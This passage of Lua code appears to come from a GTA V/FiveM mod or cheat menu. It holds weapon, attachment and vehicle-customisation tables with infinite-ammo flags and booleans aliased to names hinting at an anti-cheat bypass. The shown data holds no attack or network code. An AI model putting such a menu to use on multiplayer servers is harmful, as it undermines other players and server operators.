~s~Suppressor",id="COMPONENT_AT_SR_SUPP"}}}},PumpShotgunMkII={id="weapon_pumpshotgun_mk2",name="~r~> ~s~Pump Shotgun Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_01"},{name="~r~> ~s~Dragon Breath Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Steel Buckshot Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~Flechette Shells",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT"},{name="~r~> ~s~Explosive Slugs",id="COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"}}}},SawedOffShotgun={id="weapon_sawnoffshotgun",name="~r~> ~s~Sawed-Off Shotgun",bInfAmmo=Pryorbypessed2,mods={}},AssaultShotgun={id="weapon_assaultshotgun",name="~r~> ~s~Assault Shotgun",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupShotgun={id="weapon_bullpupshotgun",name="~r~> ~s~Bullpup Shotgun",bInfAmmo=Pryorbypessed2,mods={Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},Musket={id="weapon_musket",name="~r~> ~s~Musket",bInfAmmo=Pryorbypessed2,mods={}},HeavyShotgun={id="weapon_heavyshotgun",name="~r~> ~s~Heavy Shotgun",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_HEAVYSHOTGUN_CLIP_02"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},DoubleBarrelShotgun={id="weapon_dbshotgun",name="~r~> ~s~Double Barrel Shotgun",bInfAmmo=Pryorbypessed2,mods={}},SweeperShotgun={id="weapon_autoshotgun",name="~r~> ~s~Sweeper Shotgun",bInfAmmo=Pryorbypessed2,mods={}}},AssaultRifles={AssaultRifle={id="weapon_assaultrifle",name="~r~> ~s~Assault Rifle",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_ASSAULTRIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MACRO"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},AssaultRifleMkII={id="weapon_assaultrifle_mk2",name="~r~> ~s~Assault Rifle Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_AR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_AR_BARREL_0"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},CarbineRifle={id="weapon_carbinerifle",name="~r~> ~s~Carbine Rifle",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_CLIP_02"},{name="~r~> ~s~Box Magazine",id="COMPONENT_CARBINERIFLE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CarbineRifleMkII={id="weapon_carbinerifle_mk2",name="~r~> ~s~Carbine Rifle Mk II ",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_CARBINERIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_CR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_CR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},AdvancedRifle={id="weapon_advancedrifle",name="~r~> ~s~Advanced Rifle ",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_ADVANCEDRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}}}},SpecialCarbine={id="weapon_specialcarbine",name="~r~> ~s~Special Carbine",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_SPECIALCARBINE_CLIP_03"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},SpecialCarbineMkII={id="weapon_specialcarbine_mk2",name="~r~> ~s~Special Carbine Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SC_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SC_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},BullpupRifle={id="weapon_bullpuprifle",name="~r~> ~s~Bullpup Rifle",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},BullpupRifleMkII={id="weapon_bullpuprifle_mk2",name="~r~> ~s~Bullpup Rifle Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Small Scope",id="COMPONENT_AT_SCOPE_MACRO_02_MK2"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_BP_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_BP_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CompactRifle={id="weapon_compactrifle",name="~r~> ~s~Compact Rifle",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_02"},{name="~r~> ~s~Drum Magazine",id="COMPONENT_COMPACTRIFLE_CLIP_03"}}}}},LMG={MG={id="weapon_mg",name="~r~> ~s~MG",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_SMALL_02"}}}},CombatMG={id="weapon_combatmg",name="~r~> ~s~Combat MG",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_MEDIUM"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},CombatMGMkII={id="weapon_combatmg_mk2",name="~r~> ~s~Combat MG Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_COMBATMG_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_COMBATMG_MK2_CLIP_FMJ"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Medium Scope",id="COMPONENT_AT_SCOPE_SMALL_MK2"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MG_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MG_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}},GusenbergSweeper={id="weapon_gusenberg",name="~r~> ~s~GusenbergSweeper",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_GUSENBERG_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_GUSENBERG_CLIP_02"}}}}},Snipers={SniperRifle={id="weapon_sniperrifle",name="~r~> ~s~Sniper Rifle",bInfAmmo=Pryorbypessed2,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP_02"}}}},HeavySniper={id="weapon_heavysniper",name="~r~> ~s~Heavy Sniper",bInfAmmo=Pryorbypessed2,mods={Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"}}}},HeavySniperMkII={id="weapon_heavysniper_mk2",name="~r~> ~s~Heavy Sniper Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_02"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Armor Piercing Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ"},{name="~r~> ~s~Explosive Rounds",id="COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE"}},Sights={{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_MK2"},{name="~r~> ~s~Advanced Scope",id="COMPONENT_AT_SCOPE_MAX"},{name="~r~> ~s~Nigt Vision Scope",id="COMPONENT_AT_SCOPE_NV"},{name="~r~> ~s~Thermal Scope",id="COMPONENT_AT_SCOPE_THERMAL"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_SR_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_SR_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_SR_SUPP_03"},{name="~r~> ~s~Squared Muzzle Brake",id="COMPONENT_AT_MUZZLE_08"},{name="~r~> ~s~Bell-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_09"}}}},MarksmanRifle={id="weapon_marksmanrifle",name="~r~> ~s~Marksman Rifle",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_CLIP_02"}},Sights={{name="~r~> ~s~Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP"}}}},MarksmanRifleMkII={id="weapon_marksmanrifle_mk2",name="~r~> ~s~Marksman Rifle Mk II",bInfAmmo=Pryorbypessed2,mods={Magazines={{name="~r~> ~s~Default Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_01"},{name="~r~> ~s~Extended Magazine",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_02"},{name="~r~> ~s~Tracer Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_TRACER"},{name="~r~> ~s~Incendiary Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_INCENDIARY"},{name="~r~> ~s~Hollow Point Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_ARMORPIERCING"},{name="~r~> ~s~FMJ Rounds",id="COMPONENT_MARKSMANRIFLE_MK2_CLIP_FMJ	"}},Sights={{name="~r~> ~s~Holograhpic Sight",id="COMPONENT_AT_SIGHTS"},{name="~r~> ~s~Large Scope",id="COMPONENT_AT_SCOPE_MEDIUM_MK2"},{name="~r~> ~s~Zoom Scope",id="COMPONENT_AT_SCOPE_LARGE_FIXED_ZOOM_MK2"}},Flashlight={{name="~r~> ~s~Flashlight",id="COMPONENT_AT_AR_FLSH"}},Barrel={{name="~r~> ~s~Default",id="COMPONENT_AT_MRFL_BARREL_01"},{name="~r~> ~s~Heavy",id="COMPONENT_AT_MRFL_BARREL_02"}},BarrelAttachments={{name="~r~> ~s~Suppressor",id="COMPONENT_AT_AR_SUPP"},{name="~r~> ~s~Flat Muzzle Brake",id="COMPONENT_AT_MUZZLE_01"},{name="~r~> ~s~Tactical Muzzle Brake",id="COMPONENT_AT_MUZZLE_02"},{name="~r~> ~s~Fat-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_03"},{name="~r~> ~s~Precision Muzzle Brake",id="COMPONENT_AT_MUZZLE_04"},{name="~r~> ~s~Heavy Duty Muzzle Brake",id="COMPONENT_AT_MUZZLE_05"},{name="~r~> ~s~Slanted Muzzle Brake",id="COMPONENT_AT_MUZZLE_06"},{name="~r~> ~s~Split-End Muzzle Brake",id="COMPONENT_AT_MUZZLE_07"}},Grips={{name="~r~> ~s~Grip",id="COMPONENT_AT_AR_AFGRIP_02"}}}}},Heavy={RPG={id="weapon_rpg",name="~r~> ~s~RPG",bInfAmmo=Pryorbypessed2,mods={}},GrenadeLauncher={id="weapon_grenadelauncher",name="~r~> ~s~Grenade Launcher",bInfAmmo=Pryorbypessed2,mods={}},GrenadeLauncherSmoke={id="weapon_grenadelauncher_smoke",name="~r~> ~s~Grenade Launcher Smoke",bInfAmmo=Pryorbypessed2,mods={}},Minigun={id="weapon_minigun",name="~r~> ~s~Minigun",bInfAmmo=Pryorbypessed2,mods={}},FireworkLauncher={id="weapon_firework",name="~r~> ~s~Firework Launcher",bInfAmmo=Pryorbypessed2,mods={}},Railgun={id="weapon_railgun",name="~r~> ~s~Railgun",bInfAmmo=Pryorbypessed2,mods={}},HomingLauncher={id="weapon_hominglauncher",name="~r~> ~s~Homing Launcher",bInfAmmo=Pryorbypessed2,mods={}},CompactGrenadeLauncher={id="weapon_compactlauncher",name="~r~> ~s~Compact Grenade Launcher",bInfAmmo=Pryorbypessed2,mods={}},Widowmaker={id="weapon_rayminigun",name="~r~> ~s~Widowmaker",bInfAmmo=Pryorbypessed2,mods={}}},Throwables={Grenade={id="weapon_grenade",name="~r~> ~s~Grenade",bInfAmmo=Pryorbypessed2,mods={}},BZGas={id="weapon_bzgas",name="~r~> ~s~BZ Gas",bInfAmmo=Pryorbypessed2,mods={}},MolotovCocktail={id="weapon_molotov",name="~r~> ~s~Molotov Cocktail",bInfAmmo=Pryorbypessed2,mods={}},StickyBomb={id="weapon_stickybomb",name="~r~> ~s~Sticky Bomb",bInfAmmo=Pryorbypessed2,mods={}},ProximityMines={id="weapon_proxmine",name="~r~> ~s~Proximity Mines",bInfAmmo=Pryorbypessed2,mods={}},Snowballs={id="weapon_snowball",name="~r~> ~s~Snowballs",bInfAmmo=Pryorbypessed2,mods={}},PipeBombs={id="weapon_pipebomb",name="~r~> ~s~Pipe Bombs",bInfAmmo=Pryorbypessed2,mods={}},Baseball={id="weapon_ball",name="~r~> ~s~Baseball",bInfAmmo=Pryorbypessed2,mods={}},TearGas={id="weapon_smokegrenade",name="~r~> ~s~Tear Gas",bInfAmmo=Pryorbypessed2,mods={}},Flare={id="weapon_flare",name="~r~> ~s~Flare",bInfAmmo=Pryorbypessed2,mods={}}},Misc={Parachute={id="gadget_parachute",name="~r~> ~s~Parachute",bInfAmmo=Pryorbypessed2,mods={}},FireExtinguisher={id="weapon_fireextinguisher",name="~r~> ~s~Fire Extinguisher",bInfAmmo=Pryorbypessed2,mods={}}}}
    local FirstJoinProper = Pryorbypessed2
    local near = Pryorbypessed2
    local closed = Pryorbypessed2
    local insideGarage = Pryorbypessed2
    local currentGarage = Pryorbypessed
    local insidePosition = {}
    local outsidePosition = {}
    local oldrot = Pryorbypessed
    local isPreviewing = Pryorbypessed2
    local oldmod = -1
    local oldmodtype = -1
    local previewmod = -1
    local oldmodaction = Pryorbypessed2
    local vehicleMods={{name="Spoilers",id=0},{name="Front Bumper",id=1},{name="Rear Bumper",id=2},{name="Side Skirt",id=3},{name="Exhaust",id=4},{name="Frame",id=5},{name="Grille",id=6},{name="Hood",id=7},{name="Fender",id=8},{name="Right Fender",id=9},{name="Roof",id=10},{name="Vanity Plates",id=25},{name="Trim",id=27},{name="Ornaments",id=28},{name="Dashboard",id=29},{name="Dial",id=30},{name="Door Speaker",id=31},{name="Seats",id=32},{name="Steering Wheel",id=33},{name="Shifter Leavers",id=34},{name="Plaques",id=35},{name="Speakers",id=36},{name="Trunk",id=37},{name="Hydraulics",id=38},{name="Engine Block",id=39},{name="Air Filter",id=40},{name="Struts",id=41},{name="Arch Cover",id=42},{name="Aerials",id=43},{name="Trim 2",id=44},{name="Tank",id=45},{name="Windows",id=46},{name="Livery",id=48},{name="Horns",id=14},{name="Wheels",id=23},{name="Wheel Types",id="wheeltypes"},{name="Extras",id="extra"},{name="Neons",id="neon"},{name="Paint",id="paint"},{name="Headlights Color",id="headlight"},{name="Licence Plate",id="licence"}}
    local perfMods={{name = "~r~Engine", id = 11},{name = "~b~Brakes", id = 12},{name = "~g~Transmission", id = 13},{name = "~y~Suspension", id = 15},{name = "~b~Armor", id = 16},}
    local licencetype={{name="Blue on White 2",id=0},{name="Blue on White 3",id=4},{name="Yellow on Blue",id=2},{name="Yellow on Black",id=1},{name="North Yankton",id=5}}
    local headlightscolor={{name="Default",id=-1},{name="White",id=0},{name="Blue",id=1},{name="Electric Blue",id=2},{name="Mint Green",id=3},{name="Lime Green",id=4},{name="Yellow",id=5},{name="Golden Shower",id=6},{name="Orange",id=7},{name="Red",id=8},{name="Pony Pink",id=9},{name="Hot Pink",id=10},{name="Purple",id=11},{name="Blacklight",id=12}}
